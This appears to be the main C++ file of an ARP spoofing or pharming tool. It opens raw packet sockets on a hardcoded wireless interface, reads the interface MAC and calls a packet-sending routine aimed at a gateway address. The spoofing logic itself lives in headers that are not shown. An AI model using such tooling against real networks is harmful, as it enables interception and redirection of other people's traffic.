#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>

#include <linux/if_packet.h>
#include "arp.h"
#include "pharm_attack.h"


int main()
{
    std::string sender_mac, target_mac;
    std::string sender_ip = "192.168.0.19", target_ip = "192.168.0.1";
    int sock, tmp_sock;
    int ifindex;
    struct ifreq ifr;
    tmp_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (tmp_sock == -1) {
            perror("socket():");
            exit(1);
    }
    strcpy(ifr.ifr_name, "wlp3s0");
    /*retrieve ethernet interface index*/
    if (ioctl(tmp_sock, SIOCGIFINDEX, &ifr) == -1) {
        perror("SIOCGIFINDEX");
        exit(1);
    }
    ifindex = ifr.ifr_ifindex;

    if (ioctl(tmp_sock, SIOCGIFHWADDR, &ifr) == -1) {
            perror("SIOCGIFINDEX");
            exit(1);
    }
    close (tmp_sock);

    if ((sock = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
        perror ("socket() failed ");
        exit (EXIT_FAILURE);
    }
    mac_char_to_string(sender_mac, ifr.ifr_hwaddr.sa_data);

    send_packet(sock, ifindex, sender_ip, sender_mac, target_ip, target_mac);

    return 0;
}

void print_devices(std::vector<std::pair<std::string, std::string>> &answered_list)
{
    for (std::pair<std::string, std::string> addr_pair : answered_list) {
        std::cout << addr_pair.first << " " << addr_pair.second << std::endl;
    }
}
